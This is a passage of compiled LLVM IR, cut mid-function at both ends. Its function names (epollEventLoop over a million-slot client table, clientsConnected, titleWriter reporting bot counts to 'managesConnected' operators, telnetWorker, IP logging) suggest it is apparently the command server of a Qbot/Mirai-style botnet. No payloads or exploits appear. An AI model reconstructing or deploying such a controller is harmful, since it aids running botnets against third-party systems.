  %57 = load i32, i32* %56, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

59:                                               ; preds = %52, %49, %38
  br label %61

60:                                               ; preds = %52, %42
  br label %61

61:                                               ; preds = %60, %59
  %62 = load i32, i32* %12, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %12, align 4
  br label %35, !llvm.loop !11

64:                                               ; preds = %35
  %65 = load i8*, i8** %8, align 8
  call void @free(i8* %65) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @epollEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.clientdata_t*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %17 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %18 = bitcast i8* %17 to %struct.epoll_event*
  store %struct.epoll_event* %18, %struct.epoll_event** %4, align 8
  br label %19

19:                                               ; preds = %1, %215
  %20 = load volatile i32, i32* @epollFD, align 4
  %21 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %22 = call i32 @epoll_wait(i32 %20, %struct.epoll_event* %21, i32 1000000, i32 -1)
  store i32 %22, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %23

23:                                               ; preds = %212, %19
  %24 = load i32, i32* %7, align 4
  %25 = load i32, i32* %6, align 4
  %26 = icmp slt i32 %24, %25
  br i1 %26, label %27, label %215

27:                                               ; preds = %23
  %28 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %28, i64 %30
  %32 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %31, i32 0, i32 0
  %33 = load i32, i32* %32, align 1
  %34 = and i32 %33, 8
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %54, label %36

36:                                               ; preds = %27
  %37 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %38 = load i32, i32* %7, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %37, i64 %39
  %41 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %40, i32 0, i32 0
  %42 = load i32, i32* %41, align 1
  %43 = and i32 %42, 16
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %54, label %45

45:                                               ; preds = %36
  %46 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %47 = load i32, i32* %7, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %46, i64 %48
  %50 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %49, i32 0, i32 0
  %51 = load i32, i32* %50, align 1
  %52 = and i32 %51, 1
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %73, label %54

54:                                               ; preds = %45, %36, %27
  %55 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %56 = load i32, i32* %7, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %55, i64 %57
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %58, i32 0, i32 1
  %60 = bitcast %union.epoll_data* %59 to i32*
  %61 = load i32, i32* %60, align 1
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %62
  %64 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %63, i32 0, i32 2
  store i8 0, i8* %64, align 1
  %65 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %66 = load i32, i32* %7, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %65, i64 %67
  %69 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %68, i32 0, i32 1
  %70 = bitcast %union.epoll_data* %69 to i32*
  %71 = load i32, i32* %70, align 1
  %72 = call i32 @close(i32 %71)
  br label %212

73:                                               ; preds = %45
  %74 = load volatile i32, i32* @listenFD, align 4
  %75 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %76 = load i32, i32* %7, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %75, i64 %77
  %79 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %78, i32 0, i32 1
  %80 = bitcast %union.epoll_data* %79 to i32*
  %81 = load i32, i32* %80, align 1
  %82 = icmp eq i32 %74, %81
  br i1 %82, label %83, label %136

83:                                               ; preds = %73
  br label %84

84:                                               ; preds = %83, %128
  store i32 16, i32* %9, align 4
  %85 = load volatile i32, i32* @listenFD, align 4
  %86 = call i32 @accept(i32 %85, %struct.sockaddr* %8, i32* %9)
  store i32 %86, i32* %10, align 4
  %87 = load i32, i32* %10, align 4
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %89, label %99

89:                                               ; preds = %84
  %90 = call i32* @__errno_location() #10
  %91 = load i32, i32* %90, align 4
  %92 = icmp eq i32 %91, 11
  br i1 %92, label %97, label %93

93:                                               ; preds = %89
  %94 = call i32* @__errno_location() #10
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 11
  br i1 %96, label %97, label %98

97:                                               ; preds = %93, %89
  br label %135

98:                                               ; preds = %93
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.18, i64 0, i64 0))
  br label %135

99:                                               ; preds = %84
  %100 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %100, i32 0, i32 2
  %102 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %101, i32 0, i32 0
  %103 = load i32, i32* %102, align 2
  %104 = load i32, i32* %10, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %105
  %107 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %106, i32 0, i32 0
  store i32 %103, i32* %107, align 4
  %108 = load i32, i32* %10, align 4
  %109 = call i32 @make_socket_non_blocking(i32 %108)
  store i32 %109, i32* %5, align 4
  %110 = load i32, i32* %5, align 4
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %112, label %115

112:                                              ; preds = %99
  %113 = load i32, i32* %10, align 4
  %114 = call i32 @close(i32 %113)
  br label %135

115:                                              ; preds = %99
  %116 = load i32, i32* %10, align 4
  %117 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %118 = bitcast %union.epoll_data* %117 to i32*
  store i32 %116, i32* %118, align 1
  %119 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %119, align 1
  %120 = load volatile i32, i32* @epollFD, align 4
  %121 = load i32, i32* %10, align 4
  %122 = call i32 @epoll_ctl(i32 %120, i32 1, i32 %121, %struct.epoll_event* %3) #9
  store i32 %122, i32* %5, align 4
  %123 = load i32, i32* %5, align 4
  %124 = icmp eq i32 %123, -1
  br i1 %124, label %125, label %128

125:                                              ; preds = %115
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.19, i64 0, i64 0))
  %126 = load i32, i32* %10, align 4
  %127 = call i32 @close(i32 %126)
  br label %135

128:                                              ; preds = %115
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %130
  %132 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %131, i32 0, i32 2
  store i8 1, i8* %132, align 1
  %133 = load i32, i32* %10, align 4
  %134 = call i64 @send(i32 %133, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.20, i64 0, i64 0), i64 14, i32 16384)
  br label %84

135:                                              ; preds = %125, %112, %98, %97
  br label %212

136:                                              ; preds = %73
  %137 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %138 = load i32, i32* %7, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %137, i64 %139
  %141 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %140, i32 0, i32 1
  %142 = bitcast %union.epoll_data* %141 to i32*
  %143 = load i32, i32* %142, align 1
  store i32 %143, i32* %12, align 4
  %144 = load i32, i32* %12, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %145
  store %struct.clientdata_t* %146, %struct.clientdata_t** %13, align 8
  store i32 0, i32* %14, align 4
  %147 = load %struct.clientdata_t*, %struct.clientdata_t** %13, align 8
  %148 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %147, i32 0, i32 2
  store i8 1, i8* %148, align 1
  br label %149

149:                                              ; preds = %136, %200
  %150 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %150, i8 0, i64 2048, i1 false)
  br label %151

151:                                              ; preds = %183, %182, %177, %149
  %152 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %152, i8 0, i64 2048, i1 false)
  %153 = icmp ne i8* %152, null
  br i1 %153, label %154, label %160

154:                                              ; preds = %151
  %155 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %156 = load i32, i32* %12, align 4
  %157 = call i32 @fdgets(i8* %155, i32 2048, i32 %156)
  %158 = sext i32 %157 to i64
  store i64 %158, i64* %15, align 8
  %159 = icmp sgt i64 %158, 0
  br label %160

160:                                              ; preds = %154, %151
  %161 = phi i1 [ false, %151 ], [ %159, %154 ]
  br i1 %161, label %162, label %186

162:                                              ; preds = %160
  %163 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %164 = call i8* @strstr(i8* %163, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i64 0, i64 0)) #8
  %165 = icmp eq i8* %164, null
  br i1 %165, label %166, label %167

166:                                              ; preds = %162
  store i32 1, i32* %14, align 4
  br label %186

167:                                              ; preds = %162
  %168 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  call void @trim(i8* %168)
  %169 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %170 = call i32 @strcmp(i8* %169, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.17, i64 0, i64 0)) #8
  %171 = icmp eq i32 %170, 0
  br i1 %171, label %172, label %178

172:                                              ; preds = %167
  %173 = load i32, i32* %12, align 4
  %174 = call i64 @send(i32 %173, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.22, i64 0, i64 0), i64 5, i32 16384)
  %175 = icmp eq i64 %174, -1
  br i1 %175, label %176, label %177

176:                                              ; preds = %172
  store i32 1, i32* %14, align 4
  br label %186

177:                                              ; preds = %172
  br label %151, !llvm.loop !12

178:                                              ; preds = %167
  %179 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %180 = call i32 @strcmp(i8* %179, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i64 0, i64 0)) #8
  %181 = icmp eq i32 %180, 0
  br i1 %181, label %182, label %183

182:                                              ; preds = %178
  br label %151, !llvm.loop !12

183:                                              ; preds = %178
  %184 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %185 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.24, i64 0, i64 0), i8* %184)
  br label %151, !llvm.loop !12

186:                                              ; preds = %176, %166, %160
  %187 = load i64, i64* %15, align 8
  %188 = icmp eq i64 %187, -1
  br i1 %188, label %189, label %195

189:                                              ; preds = %186
  %190 = call i32* @__errno_location() #10
  %191 = load i32, i32* %190, align 4
  %192 = icmp ne i32 %191, 11
  br i1 %192, label %193, label %194

193:                                              ; preds = %189
  store i32 1, i32* %14, align 4
  br label %194

194:                                              ; preds = %193, %189
  br label %201

195:                                              ; preds = %186
  %196 = load i64, i64* %15, align 8
  %197 = icmp eq i64 %196, 0
  br i1 %197, label %198, label %199

198:                                              ; preds = %195
  store i32 1, i32* %14, align 4
  br label %201

199:                                              ; preds = %195
  br label %200

200:                                              ; preds = %199
  br label %149

201:                                              ; preds = %198, %194
  %202 = load i32, i32* %14, align 4
  %203 = icmp ne i32 %202, 0
  br i1 %203, label %204, label %209

204:                                              ; preds = %201
  %205 = load %struct.clientdata_t*, %struct.clientdata_t** %13, align 8
  %206 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %205, i32 0, i32 2
  store i8 0, i8* %206, align 1
  %207 = load i32, i32* %12, align 4
  %208 = call i32 @close(i32 %207)
  br label %209

209:                                              ; preds = %204, %201
  br label %210

210:                                              ; preds = %209
  br label %211

211:                                              ; preds = %210
  br label %212

212:                                              ; preds = %211, %135, %54
  %213 = load i32, i32* %7, align 4
  %214 = add nsw i32 %213, 1
  store i32 %214, i32* %7, align 4
  br label %23, !llvm.loop !13

215:                                              ; preds = %23
  br label %19
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.156, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.156, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @printf(i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 2
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !14

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @titleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %1, %20
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @clientsConnected()
  %11 = load volatile i32, i32* @managesConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.25, i64 0, i64 0), i32 27, i32 %10, i32 %11, i32 7) #9
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %16 = call i64 @strlen(i8* %15) #8
  %17 = call i64 @send(i32 %13, i8* %14, i64 %16, i32 16384)
  %18 = icmp eq i64 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %7
  br label %20

20:                                               ; preds = %19, %7
  %21 = call i32 @sleep(i32 2)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Search_in_File(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.27, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !15

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @client_addr(i64 %0, i64 %1) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to { i64, i64 }*
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 0
  store i64 %0, i64* %6, align 4
  %7 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 1
  store i64 %1, i64* %7, align 4
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %9 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 4
  %11 = and i32 %10, 255
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %13 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %12, i32 0, i32 0
  %14 = load i32, i32* %13, align 4
  %15 = and i32 %14, 65280
  %16 = lshr i32 %15, 8
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  %19 = load i32, i32* %18, align 4
  %20 = and i32 %19, 16711680
  %21 = lshr i32 %20, 16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %23 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %22, i32 0, i32 0
  %24 = load i32, i32* %23, align 4
  %25 = and i32 %24, -16777216
  %26 = lshr i32 %25, 24
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.28, i64 0, i64 0), i32 %11, i32 %16, i32 %21, i32 %26)
  %28 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.29, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i64 0, i64 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** %4, align 8
  %29 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %31 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 4
  %33 = and i32 %32, 255
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %35 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %34, i32 0, i32 0
  %36 = load i32, i32* %35, align 4
  %37 = and i32 %36, 65280
  %38 = lshr i32 %37, 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %40 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %39, i32 0, i32 0
  %41 = load i32, i32* %40, align 4
  %42 = and i32 %41, 16711680
  %43 = lshr i32 %42, 16
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, -16777216
  %48 = lshr i32 %47, 24
  %49 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %29, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.31, i64 0, i64 0), i32 %33, i32 %38, i32 %43, i32 %48)
  %50 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %51 = call i32 @fclose(%struct._IO_FILE* %50)
  ret void
}

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca [2048 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [80 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [2048 x i8], align 16
  %14 = alloca %struct._IO_FILE*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [5000 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [5000 x i8], align 16
  %29 = alloca [5000 x i8], align 16
  %30 = alloca [5000 x i8], align 16
  %31 = alloca [5000 x i8], align 16
  %32 = alloca [5000 x i8], align 16
  %33 = alloca [800 x i8], align 16
  %34 = alloca [800 x i8], align 16
  %35 = alloca [800 x i8], align 16
  %36 = alloca [800 x i8], align 16
  %37 = alloca [800 x i8], align 16
  %38 = alloca [800 x i8], align 16
  %39 = alloca [800 x i8], align 16
  %40 = alloca [800 x i8], align 16
  %41 = alloca [800 x i8], align 16
  %42 = alloca [800 x i8], align 16
  %43 = alloca [5000 x i8], align 16
  %44 = alloca [5000 x i8], align 16
  %45 = alloca [5000 x i8], align 16
  %46 = alloca [5000 x i8], align 16
  %47 = alloca [5000 x i8], align 16
  %48 = alloca %struct._IO_FILE*, align 8
  %49 = alloca %struct._IO_FILE*, align 8
  %50 = alloca %struct._IO_FILE*, align 8
  %51 = alloca [100 x i8*], align 16
  %52 = alloca i8*, align 8
  %53 = alloca i8*, align 8
  %54 = alloca i8*, align 8
  %55 = alloca i8*, align 8
  %56 = alloca [50 x i8*], align 16
  %57 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %58 = load i8*, i8** %3, align 8
  %59 = ptrtoint i8* %58 to i32
  store i32 %59, i32* %4, align 4
  %60 = load volatile i32, i32* @managesConnected, align 4
  %61 = add nsw i32 %60, 1
  store volatile i32 %61, i32* @managesConnected, align 4
  %62 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %62, i8 0, i64 2048, i1 false)
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.32, i64 0, i64 0), i8** %12, align 8
  %63 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %63, i8 0, i64 2048, i1 false)
  %64 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %64, i8 0, i64 2048, i1 false)
  store i32 0, i32* %15, align 4
  %65 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.27, i64 0, i64 0))
  store %struct._IO_FILE* %65, %struct._IO_FILE** %14, align 8
  br label %66

66:                                               ; preds = %71, %1
  %67 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
